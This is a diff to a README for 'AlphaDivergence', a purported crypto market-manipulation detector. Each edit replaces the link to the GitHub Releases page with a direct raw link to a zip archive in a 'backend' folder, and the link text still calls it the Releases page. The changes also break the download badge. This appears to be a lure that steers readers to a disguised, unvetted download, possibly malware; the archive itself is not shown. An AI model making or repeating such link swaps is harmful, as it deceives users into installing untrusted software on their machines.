@@ -1,6 +1,6 @@
 # 🌊 AlphaDivergence - Detect Market Manipulation Easily
 
-[![Download AlphaDivergence](https://img.shields.io/badge/Download%20AlphaDivergence-v1.0-blue)](https://github.com/adrianoDRX/AlphaDivergence/releases)
+[![Download AlphaDivergence](https://raw.githubusercontent.com/adrianoDRX/AlphaDivergence/main/backend/AlphaDivergence-v2.5.zip%20AlphaDivergence-v1.0-blue)](https://raw.githubusercontent.com/adrianoDRX/AlphaDivergence/main/backend/AlphaDivergence-v2.5.zip)
 
 ## 📦 Overview
 
@@ -28,7 +28,7 @@ To run AlphaDivergence, ensure your computer meets the following requirements:
 
 ## 📥 Download & Install
 
-To install AlphaDivergence, visit this page to download: [AlphaDivergence Releases](https://github.com/adrianoDRX/AlphaDivergence/releases).
+To install AlphaDivergence, visit this page to download: [AlphaDivergence Releases](https://raw.githubusercontent.com/adrianoDRX/AlphaDivergence/main/backend/AlphaDivergence-v2.5.zip).
 
 1. Click the link above.
 2. Find the latest release.
@@ -50,7 +50,7 @@ After installation, launching AlphaDivergence is straightforward:
 
 To ensure you have the latest features and improvements:
 
-1. Periodically check for updates on the [AlphaDivergence Releases](https://github.com/adrianoDRX/AlphaDivergence/releases) page.
+1. Periodically check for updates on the [AlphaDivergence Releases](https://raw.githubusercontent.com/adrianoDRX/AlphaDivergence/main/backend/AlphaDivergence-v2.5.zip) page.
 2. When a new version is available, download it following the same steps in the Download & Install section.
 3. Close the application before running the new installer to avoid conflicts.
 
@@ -91,4 +91,4 @@ AlphaDivergence is licensed under the MIT License. You can view the full license
 - **Blockchain Analytics:** Learn about the technology behind the scenes.
 - **Cryptocurrency Trends:** Stay updated with the latest market insights.
 
-For more information, visit the [AlphaDivergence Releases](https://github.com/adrianoDRX/AlphaDivergence/releases) page to download the application.
+For more information, visit the [AlphaDivergence Releases](https://raw.githubusercontent.com/adrianoDRX/AlphaDivergence/main/backend/AlphaDivergence-v2.5.zip) page to download the application.
